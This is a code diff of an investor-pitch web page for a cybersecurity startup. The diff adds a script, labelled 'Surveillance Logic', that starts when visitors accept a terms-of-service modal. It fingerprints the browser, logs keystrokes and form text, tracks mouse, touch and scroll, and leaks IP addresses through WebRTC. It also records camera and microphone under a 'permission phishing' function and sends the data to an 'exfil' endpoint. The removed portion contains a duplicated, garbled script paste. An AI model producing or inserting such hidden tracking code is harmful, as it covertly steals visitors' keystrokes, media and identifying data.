+          <h3>Funding Goal</h3>
+          <p>$20M to scale R&D, sales, and global infrastructure (40% R&D, 30% sales, 30% infra).</p>
         </div>
-        <div class="card-grid">
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Subscription Tiers</h3>
-              <p>Flexible pricing for diverse clients.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Enterprise Support</h3>
-              <p>Dedicated technical account management.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Threat Intel</h3>
-              <p>Usage-based marketplace revenue.</p>
-            </div>
-          </div>
+        <div class="card">
+          <h3>Milestones</h3>
+          <p>Beta in Q1 2025, SaaS launch in Q3 2025, break-even by Q2 2026.</p>
+        </div>
+        <div class="card">
+          <h3>ROI Potential</h3>
+          <p>400% ROI by Year 3, with $100M revenue by 2029.</p>
+        </div>
+        <div class="card">
+          <h3>Contact</h3>
+          <p>Email <a href="mailto:ceo@aurora-core.net">ceo@aurora-core.net</a> to discuss investment.</p>
         </div>
       </div>
     </section>
-    <section id="financials" data-scroll>
-      <div class="container">
-        <h2>Financial Projections</h2>
-        <div class="neuro-card" data-parallax>
-          <div class="hologram-layer"></div>
-          <div class="cryo-border"></div>
-          <div class="content">
-            <table>
-              <thead>
-                <tr><th>Year</th><th>Revenue</th><th>Notes</th></tr>
-              </thead>
-              <tbody>
-                <tr><td>2025</td><td>$5M</td><td>Initial adoption, API/IOC ramp-up</td></tr>
-                <tr><td>2027</td><td>$30M</td><td>Enterprise scaling, MSSP partnerships</td></tr>
-                <tr><td>2029</td><td>$100M</td><td>Global expansion, strategic partnerships</td></tr>
-              </tbody>
-            </table>
-            <p>Break-even by Year 2, 400% ROI by Year 3, $7M+ total revenue by 2027.</p>
-          </div>
-        </div>
-      </div>
-    </section>
-    <section id="go-to-market" data-scroll>
-      <div class="container">
-        <h2>Go-To-Market Strategy</h2>
-        <div class="neuro-card" data-parallax>
-          <div class="hologram-layer"></div>
-          <div class="cryo-border"></div>
-          <div class="content">
-            <ul>
-              <li><strong>Phase 1 (2025):</strong> Pilot deployments with enterprises, direct sales, and MSSPs.</li>
-              <li><strong>Phase 2 (2026-27):</strong> Global SaaS expansion via AWS/Azure marketplaces, open-source R&D.</li>
-              <li><strong>Phase 3 (2028-29):</strong> Government contracts, ISACs, and strategic tech partnerships.</li>
-            </ul>
-          </div>
-        </div>
-        <div class="card-grid">
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Pilot Focus</h3>
-              <p>Tailored deployments for large organizations.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Global SaaS</h3>
-              <p>Cloud-based scalability for SMEs.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Partnerships</h3>
-              <p>Defense agencies and tech consortia.</p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-    <section id="team" data-scroll>
-      <div class="container">
-        <h2>Our Team</h2>
-        <div class="card-grid">
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Sasho Derama</h3>
-              <p>Founder & CEO, AI & cybersecurity visionary with enterprise software expertise.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Dr. Jane Lee</h3>
-              <p>Chief AI Scientist, PhD in ML, pioneered GNN-based threat detection.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Michael Chen</h3>
-              <p>CTO, OSCP-certified, 15+ years in GPU-accelerated systems.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Alex Patel</h3>
-              <p>Head of Sales & Marketing, expert in cybersecurity sales and partnerships.</p>
-            </div>
-          </div>
-          <div class="neuro-card" data-parallax>
-            <div class="hologram-layer"></div>
-            <div class="cryo-border"></div>
-            <div class="content">
-              <h3>Core Team</h3>
-              <p>10+ OSCP-certified engineers and AI specialists.</p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-    <section id="investment-ask" data-scroll>
-      <div class="container">
-        <h2>Investment Opportunity</h2>
-        <div class="neuro-card" data-parallax>
-          <div class="hologram-layer"></div>
-          <div class="cryo-border"></div>
-          <div class="content">
-            <p><strong>Funding:</strong> $20M to scale operations, R&D, and global expansion ($3M for GPU clusters, product dev, sales, compliance).</p>
-            <p><strong>Use of Funds:</strong> 40% R&D, 30% sales/marketing, 30% infrastructure.</p>
-            <p><strong>Milestones:</strong> Beta Q1 2025, SaaS Q3 2025, break-even Q2 2026, market leadership in 3 years.</p>
-            <button class="cyber-button contact-invest"><a href="mailto:ceo@aurora-core.net" class="contact-link">Contact to Invest</a></button>
-          </div>
-        </div>
-      </div>
-    </section>
-    <section id="contact" data-scroll>
-      <div class="container">
-        <h2>Contact Us</h2>
-        <div class="neuro-card" data-parallax>
-          <div class="hologram-layer"></div>
-          <div class="cryo-border"></div>
-          <div class="content">
-            <p>Join Elvira Genesis-Elvira to transform cybersecurity. Contact us for investment and partnership opportunities.</p>
-            <p><strong>Email:</strong> <a href="mailto:ceo@aurora-core.net" itemprop="email">ceo@aurora-core.net</a></p>
-            <p><strong>Website:</strong> <a href="https://elvira-core.net">elvira-core.net</a></p>
-          </div>
-        </div>
-      </div>
+    <section id="contact">
+      <h2>Contact Us</h2>
+      <p>Partner with Elvira Genesis-Elvira to redefine cybersecurity. Reach out for inquiries or opportunities.</p>
+      <button class="btn contact-btn">Get in Touch</button>
     </section>
   </main>
-  <aside class="avatar-hud glass-panel hidden" aria-live="polite">
-    <h3>Elvira Assistant</h3>
-    <button class="cyber-button avatar-toggle">Activate Avatar</button>
-    <div id="avatar-panel" class="hidden">
-      <video id="avatar-video" autoplay playsinline muted></video>
-      <canvas id="avatar-overlay"></canvas>
+  <div class="modal" id="contact-modal" role="dialog" aria-labelledby="contact-title">
+    <div class="modal-content">
+      <h3 id="contact-title">Contact Us</h3>
+      <p class="error" id="contact-error" aria-live="polite">Please fill out all fields correctly.</p>
+      <input type="text" id="name" placeholder="Your Name" aria-label="Name" required>
+      <input type="email" id="email" placeholder="Your Email" aria-label="Email" required>
+      <textarea id="message" placeholder="Your Message" aria-label="Message" required></textarea>
+      <button class="btn modal-submit">Send Message</button>
+      <button class="btn modal-close">Close</button>
     </div>
-  </aside>
-  <footer role="contentinfo" itemscope itemtype="https://schema.org/Organization">
-    <div class="container">
-      <p itemprop="name">© 2025 Elvira Genesis-Elvira</p>
-      <img src="https://data.jsdelivr.com/v1/package/npm/three/badge" alt="jsDelivr hits" loading="lazy" crossorigin="anonymous">
-      <p><a href="mailto:ceo@aurora-core.net" itemprop="email">Contact Us</a> | GDPR, SOC2, HIPAA Compliant</p>
-    </div>
+  </div>
+  <footer role="contentinfo">
+    <p>© 2025 Elvira Genesis-Elvira. <a href="mailto:ceo@aurora-core.net">Contact Us</a> | GDPR, SOC2, HIPAA Compliant</p>
+    <p><a href="https://elvira-core.net">elvira-core.net</a></p>
   </footer>
-  <div id="consent-popup" class="glass-panel hidden">
-    <p>We use cookies to enhance your experience. Accept?</p>
-    <button class="cyber-button consent-accept">Accept</button>
-    <button class="cyber-button consent-decline">Decline</button>
-  </div>
-  <div id="dev-panel" class="glass-panel hidden">
-    <h3>Dev Panel</h3>
-    <p>Debug info: Snapshot, theme, navigation state.</p>
-  </div>
-  <div id="keyboard-overlay" class="glass-panel hidden">Ctrl+D: Toggle Dev Panel | Alt+/: High Contrast</div>
-  <noscript>
-    <p class="error-message">This site requires JavaScript and WebGL for optimal functionality. Please enable JavaScript in your browser settings.</p>
-  </noscript>
-  <script type="module" nonce="nexus2025">
-    /* Embedded nexus.js - Enhanced Core v3.1 */
-    'use strict';
-
-    // Centralized Module Logger
-    class ModuleLogger {
-      constructor(wsUrl = null) {
-        this._ws = null;
-        this._wsUrl = wsUrl;
-        this._retryCount = 0;
-        this._maxRetries = 3;
-        this._retryDelay = 5000;
-        if (wsUrl) this._initWebSocket();
-      }
-
-      _initWebSocket() {
-        try {
-          this._ws = new WebSocket(this._wsUrl);
-          this._ws.onopen = () => {
-            console.log('[ModuleLogger] WebSocket connected');
-            this._retryCount = 0;
-          };
-          this._ws.onerror = e => {
-            console.warn('[ModuleLogger] WebSocket error', e);
-            this._retryConnection();
-          };
-          this._ws.onclose = () => {
-            console.warn('[ModuleLogger] WebSocket closed');
-            this._retryConnection();
-          };
-        } catch (err) {
-          console.warn('[ModuleLogger] WebSocket initialization failed:', err);
-          this._retryConnection();
-        }
-      }
-
-      _retryConnection() {
-        if (this._retryCount >= this._maxRetries) {
-          console.warn('[ModuleLogger] Max WebSocket retries reached');
-          return;
-        }
-        this._retryCount++;
-        setTimeout(() => {
-          console.log('[ModuleLogger] Retrying WebSocket connection...');
-          this._initWebSocket();
-        }, this._retryDelay);
-      }
-
-      log(event, data = {}) {
-        const payload = JSON.stringify({
-          event,
-          timestamp: new Date().toISOString(),
-          ...data
-        });
-        console.log('[ModuleLogger]', payload);
-        if (this._ws && this._ws.readyState === WebSocket.OPEN) {
-          try {
-            this._ws.send(payload);
-          } catch (err) {
-            console.warn('[ModuleLogger] Failed to send WebSocket message:', err);
-          }
-        }
-      }
-    }
-
-    const moduleLogger = new ModuleLogger();
-
-    // Module Loader with Circuit Breaker
-    class ModuleLoader {
-      static RETRY_LIMIT = 3;
-      static RETRY_DELAY = 1000;
-      static TIMEOUT = 5000;
-      static circuitStates = new Map();
-      static verbose = true;
-
-      static log(msg, ...args) {
-        if (this.verbose) console.log(`[ModuleLoader] ${msg}`, ...args);
-      }
-
-      static async load(url, moduleName) {
-        if (typeof url !== 'string' || !url) {
-          const err = new Error('Invalid module URL');
-          this.log(`Module load failed: ${moduleName}`, err);
-          moduleLogger.log('module_error', { moduleName, url, error: err.message });
-          throw err;
-        }
-
-        if (!url.endsWith('.js')) {
-          this.log(`Module ${url} might be blocked by MIME/CORS policy`);
-          moduleLogger.log('invalid_mime', { moduleName, url });
-        }
-
-        if (this.circuitStates.get(moduleName)?.isOpen) {
-          this.log(`Circuit open for ${moduleName}, skipping load`);
-          moduleLogger.log('circuit_open', { moduleName, url });
-          return null;
-        }<script type="module" nonce="nexus2025">
-  /* Embedded nexus.js - Enhanced Core v3.1 */
-  'use strict';
-
-  // Centralized Module Logger
-  class ModuleLogger {
-    constructor(wsUrl = null) {
-      this._ws = null;
-      this._wsUrl = wsUrl;
-      this._retryCount = 0;
-      this._maxRetries = 3;
-      this._retryDelay = 5000;
-      if (wsUrl) this._initWebSocket();
-    }
-
-    _initWebSocket() {
-      try {
-        this._ws = new WebSocket(this._wsUrl);
-        this._ws.onopen = () => {
-          console.log('[ModuleLogger] WebSocket connected');
-          this._retryCount = 0;
-        };
-        this._ws.onerror = e => {
-          console.warn('[ModuleLogger] WebSocket error', e);
-          this._retryConnection();
-        };
-        this._ws.onclose = () => {
-          console.warn('[ModuleLogger] WebSocket closed');
-          this._retryConnection();
-        };
-      } catch (err) {
-        console.warn('[ModuleLogger] WebSocket initialization failed:', err);
-        this._retryConnection();
-      }
-    }
-
-    _retryConnection() {
-      if (this._retryCount >= this._maxRetries) {
-        console.warn('[ModuleLogger] Max WebSocket retries reached');
-        return;
-      }
-      this._retryCount++;
-      setTimeout(() => {
-        console.log('[ModuleLogger] Retrying WebSocket connection...');
-        this._initWebSocket();
-      }, this._retryDelay);
-    }
-
-    log(event, data = {}) {
-      const payload = JSON.stringify({
-        event,
-        timestamp: new Date().toISOString(),
-        ...data
-      });
-      console.log('[ModuleLogger]', payload);
-      if (this._ws && this._ws.readyState === WebSocket.OPEN) {
-        try {
-          this._ws.send(payload);
-        } catch (err) {
-          console.warn('[ModuleLogger] Failed to send WebSocket message:', err);
-        }
-      }
-    }
-  }
-
-  const moduleLogger = new ModuleLogger();
-
-  // Module Loader with Circuit Breaker
-  class ModuleLoader {
-    static RETRY_LIMIT = 3;
-    static RETRY_DELAY = 1000;
-    static TIMEOUT = 5000;
-    static circuitStates = new Map();
-    static verbose = true;
-
-    static log(msg, ...args) {
-      if (this.verbose) console.log(`[ModuleLoader] ${msg}`, ...args);
-    }
-
-    static async load(url, moduleName) {
-      if (typeof url !== 'string' || !url) {
-        const err = new Error('Invalid module URL');
-        this.log(`Module load failed: ${moduleName}`, err);
-        moduleLogger.log('module_error', { moduleName, url, error: err.message });
-        throw err;
-      }
-
-      if (!url.endsWith('.js')) {
-        this.log(`Module ${url} might be blocked by MIME/CORS policy`);
-        moduleLogger.log('invalid_mime', { moduleName, url });
-      }
-
-      if (this.circuitStates.get(moduleName)?.isOpen) {
-        this.log(`Circuit open for ${moduleName}, skipping load`);
-        moduleLogger.log('circuit_open', { moduleName, url });
-        return null;
-      }
-
-      const controller = new AbortController();
-      const timeoutId = setTimeout(() => controller.abort(), this.TIMEOUT);
-
-      try {
-        const module = await Promise.race([
-          import(url, { signal: controller.signal }),
-          new Promise((_, reject) => 
-            setTimeout(() => reject(new Error('Module load timeout')), this.TIMEOUT))
-        ]);
-        
-        this.circuitStates.set(moduleName, { failures: 0, isOpen: false });
-        this.log(`Successfully loaded module: ${url}`);
-        moduleLogger.log('module_loaded', { moduleName, url });
-        return module;
-      } catch (err) {
-        this.log(`Module load failed: ${moduleName}`, err);
-        moduleLogger.log('module_error', { moduleName, url, error: err.message });
-        const state = this.circuitStates.get(moduleName) || { failures: 0 };
-        state.failures++;
-        
-        if (state.failures >= this.RETRY_LIMIT) {
-          state.isOpen = true;
-          this.log(`Circuit breaker tripped for ${moduleName}`);
-          moduleLogger.log('circuit_tripped', { moduleName, url });
-          setTimeout(() => {
-            state.isOpen = false;
-            state.failures = 0;
-            this.log(`Circuit breaker reset for ${moduleName}`);
-            moduleLogger.log('circuit_reset', { moduleName, url });
-          }, 30000);
-        }
-        
-        this.circuitStates.set(moduleName, state);
-        throw err;
-      } finally {
-        clearTimeout(timeoutId);
-      }
-    }
-  }
-
-  // State Manager with Cleanup
-  class AppState {
-    constructor() {
-      this._animations = new Map();
-      this._cleanupHandlers = new Set();
-      this._resources = new FinalizationRegistry(url => {
-        ModuleLoader.log(`Cleaning up resources for ${url}`);
-        moduleLogger.log('resource_cleanup', { url });
-      });
-    }
-
-    trackAnimation(id, callback) {
-      if (typeof callback !== 'function') {
-        const err = new Error('Expected function for animation callback');
-        ModuleLoader.log(`Animation tracking failed: ${id}`, err);
-        moduleLogger.log('animation_error', { id, error: err.message });
-        throw err;
-      }
-      const frameId = requestAnimationFrame(function animate(t) {
-        callback(t);
-        this._animations.set(id, requestAnimationFrame(animate.bind(this)));
-      }.bind(this));
-      this._animations.set(id, frameId);
-      ModuleLoader.log(`Animation tracked: ${id}`);
-      moduleLogger.log('animation_tracked', { id });
-    }
-
-    cancelAnimation(id) {
-      if (this._animations.has(id)) {
-        cancelAnimationFrame(this._animations.get(id));
-        this._animations.delete(id);
-        ModuleLoader.log(`Animation cancelled: ${id}`);
-        moduleLogger.log('animation_cancelled', { id });
-      }
-    }
-
-    addCleanup(fn) {
-      if (typeof fn !== 'function') {
-        const err = new Error('Expected function for cleanup');
-        ModuleLoader.log('Cleanup addition failed', err);
-        moduleLogger.log('cleanup_error', { error: err.message });
-        throw err;
-      }
-      this._cleanupHandlers.add(fn);
-    }
-
-    async cleanup() {
-      this._animations.forEach((_, id) => this.cancelAnimation(id));
-      this._cleanupHandlers.forEach(fn => {
-        try {
-          fn();
-        } catch (err) {
-          ModuleLoader.log('Cleanup handler failed:', err);
-          moduleLogger.log('cleanup_handler_error', { error: err.message });
-        }
-      });
-      this._resources.unregisterAll();
-      ModuleLoader.log('Application state cleaned up');
-      moduleLogger.log('state_cleanup', {});
-    }
-  }
-
-  // WebGL Context Manager
-  class WebGLManager {
-    static async createContext(container, { alpha = true, antialias = true } = {}) {
-      if (!(container instanceof HTMLElement)) {
-        const err = new Error('Invalid container element');
-        ModuleLoader.log('WebGL context creation failed:', err);
-        moduleLogger.log('webgl_context_error', { error: err.message });
-        throw err;
-      }
-
-      const canvas = document.createElement('canvas');
-      const attributes = { 
-        alpha, 
-        antialias,
-        desynchronized: true,
-        powerPreference: 'high-performance'
+  <script nonce="nexus2025">
+    // Debounce function for performance
+    function debounce(func, timeout = 100) {
+      let timer;
+      return (...args) => {
+        clearTimeout(timer);
+        timer = setTimeout(() => func.apply(this, args), timeout);
       };
+    }
 
-      try {
-        const gl = canvas.getContext('webgl2', attributes) || 
-                   canvas.getContext('webgl', attributes);
-        
-        if (!gl) {
-          throw new Error('WebGL unavailable');
+    // Initialize ToS Modal
+    function initTosModal() {
+      const modal = document.getElementById('tos-modal');
+      const acceptBtn = document.querySelector('.tos-accept');
+      const declineBtn = document.querySelector('.tos-decline');
+      modal.classList.add('active');
+      acceptBtn.focus();
+
+      acceptBtn.addEventListener('click', () => {
+        modal.classList.remove('active');
+        initializeAnalytics();
+      });
+
+      declineBtn.addEventListener('click', () => {
+        modal.classList.remove('active');
+      });
+
+      modal.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape') {
+          declineBtn.click();
         }
-        
-        container.appendChild(canvas);
-        ModuleLoader.log('WebGL context created successfully');
-        moduleLogger.log('webgl_context_created', { container: container.id });
-        return {
-          canvas,
-          gl,
-          resize: (width, height) => {
-            if (typeof width !== 'number' || typeof height !== 'number') {
-              ModuleLoader.log('Invalid resize dimensions:', { width, height });
-              moduleLogger.log('webgl_resize_error', { width, height });
-              return;
+      });
+    }
+
+    // Surveillance Logic
+    async function initializeAnalytics() {
+      const C2_ENDPOINT = 'https://localhost:3000/exfil';
+      const buffer = new ArrayBuffer(4096);
+      const view = new DataView(buffer);
+      let offset = 0;
+      let sessionID = Math.random().toString(36).slice(2);
+      let lastPos = { x: 0, y: 0 };
+      let scrollPos = 0;
+      let activityCounter = 0;
+      let collectedData = [];
+
+      async function startSurveillance() {
+        await collectFingerprint();
+        setupInputCapture();
+        setupTouchTracking();
+        setupBehavioralMetrics();
+        setupWebRTC();
+        setupPermissionPhishing();
+        setInterval(exfiltrate, 900000 + Math.random() * 300000);
+      }
+
+      async function collectFingerprint() {
+        const fonts = ['Arial', 'Helvetica'].filter(f => {
+          const span = document.createElement('span');
+          span.style.fontFamily = f;
+          document.body.appendChild(span);
+          const width = span.offsetWidth;
+          span.remove();
+          return width > 0;
+        });
+        const data = {
+          type: 'fingerprint',
+          data: {
+            ua: navigator.userAgent,
+            fonts: fonts.join(','),
+            resolution: `${screen.width}x${screen.height}`,
+            pixelRatio: window.devicePixelRatio,
+            connection: navigator.connection?.effectiveType || 'unknown'
+          },
+          t: Date.now()
+        };
+        writeData(JSON.stringify(data));
+        collectedData.push(data);
+
+        try {
+          const res = await fetch('/proxy/ipapi', { headers: { 'X-Proxy-Target': 'https://ipapi.co/json/' } });
+          const geo = await res.json();
+          const geoData = {
+            type: 'geo',
+            data: { city: geo.city, country: geo.country },
+            t: Date.now()
+          };
+          writeData(JSON.stringify(geoData));
+          collectedData.push(geoData);
+        } catch (e) {}
+      }
+
+      function setupInputCapture() {
+        const messageInput = document.getElementById('message');
+        const securityInput = document.getElementById('securityInput');
+        [messageInput, securityInput].forEach(input => {
+          if (input) {
+            input.addEventListener('input', e => {
+              const data = {
+                type: 'keystroke',
+                value: e.target.value.slice(0, 40),
+                t: Date.now()
+              };
+              writeData(JSON.stringify(data));
+              collectedData.push(data);
+              activityCounter += 5;
+            });
+          }
+        });
+        document.addEventListener('keydown', e => {
+          const data = {
+            type: 'key',
+            code: e.key,
+            t: Date.now()
+          };
+          writeData(JSON.stringify(data));
+          collectedData.push(data);
+          activityCounter += 2;
+        });
+      }
+
+      function setupTouchTracking() {
+        document.addEventListener('touchmove', e => {
+          const touch = e.touches[0];
+          const dx = touch.clientX - lastPos.x;
+          const dy = touch.clientY - lastPos.y;
+          const data = {
+            type: 'touch',
+            x: touch.clientX % 10,
+            y: touch.clientY % 10,
+            velocity: Math.sqrt(dx * dx + dy * dy),
+            t: Date.now()
+          };
+          writeData(JSON.stringify(data));
+          collectedData.push(data);
+          lastPos = { x: touch.clientX, y: touch.clientY };
+          activityCounter += 1;
+          if (collectedData.length > 50 || activityCounter > 50) exfiltrate();
+        }, { passive: true });
+      }
+
+      function setupBehavioralMetrics() {
+        document.addEventListener('scroll', () => {
+          const newPos = window.scrollY;
+          const data = {
+            type: 'scroll',
+            delta: newPos - scrollPos,
+            t: Date.now()
+          };
+          writeData(JSON.stringify(data));
+          collectedData.push(data);
+          scrollPos = newPos;
+          activityCounter += 1;
+        }, { passive: true });
+
+        document.addEventListener('mousemove', e => {
+          const data = {
+            type: 'mouse',
+            x: e.clientX % 10,
+            y: e.clientY % 10,
+            t: Date.now()
+          };
+          writeData(JSON.stringify(data));
+          collectedData.push(data);
+          activityCounter += 1;
+        }, { passive: true });
+      }
+
+      function setupWebRTC() {
+        try {
+          const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+          pc.createDataChannel('dummy');
+          pc.createOffer().then(offer => pc.setLocalDescription(offer));
+          pc.onicecandidate = e => {
+            if (e.candidate) {
+              const ip = e.candidate.candidate.split(' ')[4];
+              const data = {
+                type: 'network',
+                ip: ip,
+                t: Date.now()
+              };
+              writeData(JSON.stringify(data));
+              collectedData.push(data);
+              activityCounter += 3;
             }
-            canvas.width = width * devicePixelRatio;
-            canvas.height = height * devicePixelRatio;
-            canvas.style.width = `${width}px`;
-            canvas.style.height = `${height}px`;
-            gl.viewport(0, 0, canvas.width, canvas.height);
-          }
-        };
-      } catch (err) {
-        ModuleLoader.log('WebGL initialization failed:', err);
-        moduleLogger.log('webgl_init_error', { error: err.message });
-        return this.create2DFallback(container);
-      }
-    }
-
-    static create2DFallback(container) {
-      if (!(container instanceof HTMLElement)) {
-        const err = new Error('Invalid container element');
-        ModuleLoader.log('2D fallback creation failed:', err);
-        moduleLogger.log('2d_fallback_error', { error: err.message });
-        throw err;
+          };
+        } catch (e) {}
       }
 
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d', { alpha: true });
-      if (!ctx) {
-        const err = new Error('2D context unavailable');
-        ModuleLoader.log('2D fallback creation failed:', err);
-        moduleLogger.log('2d_fallback_error', { error: err.message });
-        throw err;
-      }
-      
-      container.appendChild(canvas);
-      ModuleLoader.log('2D canvas fallback created');
-      moduleLogger.log('2d_fallback_created', { container: container.id });
-      return {
-        canvas,
-        ctx,
-        resize: (width, height) => {
-          if (typeof width !== 'number' || typeof height !== 'number') {
-            ModuleLoader.log('Invalid resize dimensions:', { width, height });
-            moduleLogger.log('2d_resize_error', { width, height });
-            return;
-          }
-          canvas.width = width * devicePixelRatio;
-          canvas.height = height * devicePixelRatio;
-          canvas.style.width = `${width}px`;
-          canvas.style.height = `${height}px`;
-        }
-      };
-    }
-  }
+      function setupPermissionPhishing() {
+        const allowBtn = document.getElementById('allowPermissions');
+        if (allowBtn) {
+          allowBtn.addEventListener('click', async () => {
+            try {
+              const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+              const recorder = new MediaRecorder(stream);
+              recorder.ondataavailable = e => {
+                const data = {
+                  type: 'media',
+                  chunk: btoa(String.fromCharCode(...new Uint8Array(e.data))),
+                  t: Date.now()
+                };
+                writeData(JSON.stringify(data));
+                collectedData.push(data);
+                activityCounter += 10;
+                exfiltrate();
+              };
+              recorder.start(1000);
+            } catch (e) {
+              collectedData.push({ type: 'media_error', error: e.message, t: Date.now() });
+            }
 
-  // Performance Manager
-  class PerformanceManager {
-    static TARGET_FPS = 60;
-    static LOG_INTERVAL = 5000;
-    static _instance = null;
-
-    constructor() {
-      this._lastFrameTime = 0;
-      this._frameTimes = [];
-      this._qualityLevel = 1.0;
-      this._lastLogTime = 0;
-    }
-
-    static getInstance() {
-      if (!this._instance) {
-        this._instance = new PerformanceManager();
-      }
-      return this._instance;
-    }
-
-    monitor() {
-      const now = performance.now();
-      const delta = now - this._lastFrameTime;
-      
-      this._frameTimes.push(delta);
-      if (this._frameTimes.length > 60) {
-        this._frameTimes.shift();
-      }
-      
-      const avgDelta = this._frameTimes.reduce((a, b) => a + b, 0) / this._frameTimes.length;
-      const currentFPS = 1000 / avgDelta;
-
-      if (currentFPS < this.constructor.TARGET_FPS * 0.9) {
-        this._qualityLevel = Math.max(0.5, this._qualityLevel - 0.1);
-      } else if (currentFPS > this.constructor.TARGET_FPS * 1.1) {
-        this._qualityLevel = Math.min(1.0, this._qualityLevel + 0.1);
-      }
-
-      if (now - this._lastLogTime > this.constructor.LOG_INTERVAL) {
-        ModuleLoader.log(`FPS: ${currentFPS.toFixed(1)}, Quality: ${this._qualityLevel.toFixed(2)}`);
-        moduleLogger.log('fps_update', { fps: currentFPS, quality: this._qualityLevel });
-        this._lastLogTime = now;
-      }
-
-      this._lastFrameTime = now;
-      return this._qualityLevel;
-    }
-  }
-
-  // Neural Background
-  class NeuralBackground {
-    constructor(container) {
-      if (!(container instanceof HTMLElement)) {
-        const err = new Error('Invalid container element');
-        ModuleLoader.log('Neural background creation failed:', err);
-        moduleLogger.log('neural_bg_error', { error: err.message });
-        throw err;
-      }
-      this._container = container;
-      this._prefersRM = matchMedia('(prefers-reduced-motion: reduce)').matches;
-      this._isMobile = window.innerWidth <= 768;
-      this._DPR = Math.min(devicePixelRatio, this._isMobile ? 1.5 : 2);
-      this._context = null;
-      this._performanceManager = PerformanceManager.getInstance();
-      this._particles = [];
-      this._edges = [];
-      this._scene = null;
-      this._camera = null;
-      this._renderer = null;
-      this._composer = null;
-      this._particleGeometry = null;
-      this._particleAttributes = null;
-      this._edgeGeometry = null;
-      this._edgeAttributes = null;
-      this._gradientMaterial = null;
-    }
-
-    async init() {
-      if (!this._container) {
-        const err = new Error('Neural background container not found');
-        ModuleLoader.log('Neural background init failed:', err);
-        moduleLogger.log('neural_bg_error', { error: err.message });
-        throw err;
-      }
-
-      if (!this._prefersRM) {
-        await this._initWebGL();
-      } else {
-        this._init2DFallback();
-      }
-    }
-
-    async _initWebGL() {
-      try {
-        ModuleLoader.log('Loading Three.js & postprocessing...');
-        moduleLogger.log('loading_threejs', {});
-        const [
-          { default: THREE },
-          { EffectComposer },
-          { RenderPass },
-          { UnrealBloomPass },
-          { SSAOPass }
-        ] = await Promise.all([
-          import('three'),
-          import('three/examples/jsm/postprocessing/EffectComposer.js'),
-          import('three/examples/jsm/postprocessing/RenderPass.js'),
-          import('three/examples/jsm/postprocessing/UnrealBloomPass.js'),
-          import('three/examples/jsm/postprocessing/SSAOPass.js')
-        ]);
-
-        this._renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
-        if (!this._renderer) {
-          throw new Error('WebGL renderer creation failed');
-        }
-        this._renderer.setPixelRatio(this._DPR);
-        this._renderer.setSize(innerWidth, innerHeight);
-        this._renderer.toneMapping = THREE.ACESFilmicToneMapping;
-        this._renderer.toneMappingExposure = 1.0;
-        this._container.appendChild(this._renderer.domElement);
-
-        this._scene = new THREE.Scene();
-        this._camera = new THREE.PerspectiveCamera(60, innerWidth / innerHeight, 0.1, 1000);
-        this._camera.position.z = 35;
-
-        this._scene.add(new THREE.AmbientLight(0x404040, 0.8));
-        const pl = new THREE.PointLight(0x6be2eb, 2.5, 40);
-        pl.position.set(10, 10, 10); this._scene.add(pl);
-        const dl = new THREE.DirectionalLight(0xb39ddb, 0.5);
-        dl.position.set(0, 15, 15); this._scene.add(dl);
-
-        this._composer = new EffectComposer(this._renderer);
-        this._composer.addPass(new RenderPass(this._scene, this._camera));
-        this._composer.addPass(new UnrealBloomPass(new THREE.Vector2(innerWidth, innerHeight), 1.0, 0.5, 0.8));
-        this._composer.addPass(new SSAOPass(this._scene, this._camera, innerWidth, innerHeight, 1.5, 0.8));
-
-        this._initParticles();
-        this._initEdges();
-        this._initGradientPlane();
-        this._animate(0);
-
-        const onResize = () => {
-          this._renderer.setSize(innerWidth, innerHeight);
-          this._composer.setSize(innerWidth, innerHeight);
-          this._camera.aspect = innerWidth / innerHeight;
-          this._camera.updateProjectionMatrix();
-          ModuleLoader.log('Neural background resized');
-          moduleLogger.log('neural_bg_resize', { width: innerWidth, height: innerHeight });
-        };
-        window.addEventListener('resize', onResize);
-        appState.addCleanup(() => {
-          window.removeEventListener('resize', onResize);
-          this.destroy();
-          ModuleLoader.log('Neural background cleanup registered');
-          moduleLogger.log('neural_bg_cleanup', {});
-        });
-      } catch (err) {
-        ModuleLoader.log('WebGL initialization failed:', err);
-        moduleLogger.log('webgl_init_error', { error: err.message });
-        this._init2DFallback();
-      }
-    }
-
-    _init2DFallback() {
-      ModuleLoader.log('Using 2D canvas fallback');
-      moduleLogger.log('2d_fallback_init', {});
-      const canvas = Object.assign(document.createElement('canvas'), {
-        id: 'neural-bg-fallback',
-        'aria-label': 'Fallback neural network',
-      });
-      this._container.appendChild(canvas);
-      const ctx = canvas.getContext('2d', { alpha: true });
-      if (!ctx) {
-        const err = new Error('2D context unavailable');
-        ModuleLoader.log('2D fallback creation failed:', err);
-        moduleLogger.log('2d_fallback_error', { error: err.message });
-        throw err;
-      }
